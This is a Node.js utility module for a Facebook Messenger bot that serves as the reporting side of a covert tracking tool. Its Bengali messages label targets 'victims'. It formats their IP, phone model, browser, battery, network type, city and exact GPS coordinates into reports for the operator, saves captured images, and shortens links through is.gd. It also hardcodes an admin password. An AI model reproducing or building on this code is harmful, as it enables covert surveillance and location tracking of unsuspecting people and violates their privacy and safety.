const axios = require('axios');
const Config = require('../models/Config');
const fs = require('fs-extra');
const path = require('path');
const { nanoid } = require('nanoid');

function getLocalConfig() {
    const file = path.join(__dirname, '../data/config.json');
    if (fs.existsSync(file)) {
        try {
            return fs.readJsonSync(file);
        } catch (e) {
            return { mongoUri: '', adminPassword: 'Sakib@7890' };
        }
    }
    return { mongoUri: '', adminPassword: 'Sakib@7890' };
}

async function getConfig() {
    try {
        let config = await Config.findOne({ key: 'bot_config' });
        if (!config) {
            config = new Config({
                key: 'bot_config',
                pageAccessToken: '',
                verifyToken: 'Sakib_Verify',
                baseUrl: ''
            });
            await config.save();
        }
        return config;
    } catch (err) {
        console.log('⚠️ MongoDB থেকে কনফিগ আনতে ব্যর্থ:', err.message);
        return {
            pageAccessToken: '',
            verifyToken: 'Sakib_Verify',
            baseUrl: 'http://localhost:3000'
        };
    }
}

// ================================================================
// টেক্সট মেসেজ
// ================================================================
async function sendMessage(recipientId, text) {
    try {
        const config = await getConfig();
        const token = config.pageAccessToken;
        if (!token || token === '') {
            console.error('❌ টোকেন সেট নেই!');
            return { success: false, error: 'TOKEN_MISSING' };
        }
        if (token.length < 50) {
            console.error('❌ টোকেন খুব ছোট!');
            return { success: false, error: 'INVALID_TOKEN' };
        }

        const response = await axios.post(
            `https://graph.facebook.com/v18.0/me/messages?access_token=${token}`,
            {
                recipient: { id: recipientId },
                message: { text: text }
            },
            { timeout: 10000 }
        );

        console.log(`✅ টেক্সট মেসেজ পাঠানো হয়েছে: ${recipientId}`);
        return { success: true, data: response.data };

    } catch (err) {
        if (err.response) {
            console.error('❌ ফেসবুক এরর:', err.response.data);
        } else {
            console.error('❌ মেসেজ পাঠাতে ব্যর্থ:', err.message);
        }
        return { success: false, error: err.message };
    }
}

// ================================================================
// ইমেজ ফাইল সেভ করা
// ================================================================
async function saveImageFile(base64Image) {
    try {
        const imagesDir = path.join(__dirname, '../public/images');
        await fs.ensureDir(imagesDir);
        
        const filename = `${nanoid(10)}.jpg`;
        const filepath = path.join(imagesDir, filename);
        
        const buffer = Buffer.from(base64Image, 'base64');
        await fs.writeFile(filepath, buffer);
        
        return filename;
    } catch (err) {
        console.error('❌ ইমেজ সেভ করতে ব্যর্থ:', err);
        return null;
    }
}

// ================================================================
// ইমেজ মেসেজ পাঠানো (URL সহ)
// ================================================================
async function sendImageMessage(recipientId, imageUrl) {
    try {
        const config = await getConfig();
        const token = config.pageAccessToken;
        if (!token || token === '') {
            console.error('❌ টোকেন সেট নেই!');
            return { success: false, error: 'TOKEN_MISSING' };
        }

        const response = await axios.post(
            `https://graph.facebook.com/v18.0/me/messages?access_token=${token}`,
            {
                recipient: { id: recipientId },
                message: {
                    attachment: {
                        type: 'image',
                        payload: {
                            is_reusable: false,
                            url: imageUrl
                        }
                    }
                }
            },
            { timeout: 30000 }
        );

        console.log(`✅ ইমেজ মেসেজ পাঠানো হয়েছে: ${recipientId}`);
        return { success: true, data: response.data };

    } catch (err) {
        if (err.response) {
            console.error('❌ ইমেজ পাঠাতে ফেসবুক এরর:', err.response.data);
        } else {
            console.error('❌ ইমেজ পাঠাতে ব্যর্থ:', err.message);
        }
        return { success: false, error: err.message };
    }
}

// ================================================================
// ইউজার প্রোফাইল
// ================================================================
async function getUserProfile(senderId) {
    try {
        const config = await getConfig();
        const token = config.pageAccessToken;
        if (!token) return null;
        const res = await axios.get(`https://graph.facebook.com/${senderId}?access_token=${token}`);
        return res.data;
    } catch (err) {
        console.error('Profile fetch error:', err.message);
        return null;
    }
}

// ================================================================
// লিংক শর্ট করা (ব্যর্থ হলে আসল লিংক)
// ================================================================
async function shortenUrl(longUrl) {
    try {
        const response = await axios.get(`https://is.gd/create.php?format=simple&url=${encodeURIComponent(longUrl)}`, {
            timeout: 5000
        });
        const shortUrl = response.data.trim();
        if (shortUrl.startsWith('Error')) {
            console.warn('⚠️ is.gd শর্ট করতে ব্যর্থ:', shortUrl);
            return longUrl;
        }
        return shortUrl;
    } catch (err) {
        console.warn('⚠️ is.gd API ডাউন বা টাইমআউট:', err.message);
        return longUrl;
    }
}

// ================================================================
// ফোনের মডেল বের করা
// ================================================================
function getDeviceModel(device) {
    const ua = device.userAgent || '';
    
    let match = ua.match(/\([^;]+;\s*[^;]+;\s*([^;\)]+)/);
    if (match) {
        let model = match[1].trim();
        if (model.includes(' Build/')) {
            model = model.split(' Build/')[0];
        }
        return model;
    }
    
    match = ua.match(/\(([^;\)]+); CPU iPhone OS/);
    if (match) return match[1].trim();
    
    match = ua.match(/\(Windows NT [^;]+;\s*([^;\)]+)/);
    if (match) return match[1].trim();
    
    return device.platform || 'N/A';
}

// ================================================================
// 🔥 ভিক্টিম ডেটা ফরম্যাট (বাংলাদেশ সময় সহ)
// ================================================================
function formatVictimData(victim) {
    const d = victim.device || {};
    
    // 🔥 বাংলাদেশ সময় (GMT+6)
    const deviceTime = new Date().toLocaleString('bn-BD', { 
        timeZone: 'Asia/Dhaka',
        hour12: true,
        year: 'numeric',
        month: '2-digit',
        day: '2-digit',
        hour: '2-digit',
        minute: '2-digit',
        second: '2-digit'
    });
    
    let msg = '✅ *ভিক্টিমের তথ্য পাওয়া গেছে!*\n\n';
    msg += `⚓️ *আইপি অ্যাড্রেস:* ${victim.ip || 'N/A'}\n`;
    msg += `🕐 *সময়:* ${deviceTime}\n\n`;
    
    const model = getDeviceModel(d);
    msg += `📱 *ফোনের মডেল:* ${model}\n`;
    
    const browser = d.userAgent?.match(/(Chrome|Firefox|Safari|Edge|Opera)\/[0-9.]+/)?.[0] || 'N/A';
    msg += `🌐 *ব্রাউজার:* ${browser}\n`;
    msg += `👆 *টাচ পয়েন্ট:* ${d.maxTouchPoints || 0}\n`;
    msg += `🗣️ *ভাষা:* ${d.language || 'N/A'}\n\n`;
    
    const b = victim.battery || {};
    msg += `🔋 *চার্জ:* ${b.level || 'N/A'}%\n`;
    msg += `⚡ *চার্জ হচ্ছে:* ${b.charging ? 'হ্যাঁ' : 'না'}\n\n`;
    
    const n = victim.network || {};
    const connectionType = n.type || 'N/A';
    msg += `📶 *কানেকশন:* ${connectionType === 'wifi' ? '📶 ওয়াইফাই' : connectionType === 'cellular' ? '📱 মোবাইল ডেটা' : connectionType}\n\n`;
    
    if (victim.location && victim.location.city) {
        msg += `📍 *আনুমানিক অবস্থান:* ${victim.location.city}, ${victim.location.country}\n`;
    } else {
        msg += `📍 *আনুমানিক অবস্থান:* N/A\n`;
    }
    
    msg += `\n\n🆔 ভিক্টিম আইডি: ${victim.id}`;
    return msg;
}

// ================================================================
// লোকেশন মেসেজ
// ================================================================
function formatLocationMessage(gpsLocation) {
    if (!gpsLocation || !gpsLocation.latitude) return null;
    const mapLink = gpsLocation.googleMaps || 
        `https://www.google.com/maps?q=${gpsLocation.latitude},${gpsLocation.longitude}`;
    return `📍 *লোকেশন পারমিশন দেওয়া হয়েছে!*\n\n` +
           `📌 অক্ষাংশ: ${gpsLocation.latitude}\n` +
           `📌 দ্রাঘিমাংশ: ${gpsLocation.longitude}\n` +
           `🎯 নির্ভুলতা: ${gpsLocation.accuracy} মিটার\n\n` +
           `🔗 গুগল ম্যাপ: ${mapLink}`;
}

module.exports = {
    getConfig,
    getLocalConfig,
    sendMessage,
    saveImageFile,
    sendImageMessage,
    getUserProfile,
    shortenUrl,
    getDeviceModel,
    formatVictimData,
    formatLocationMessage
};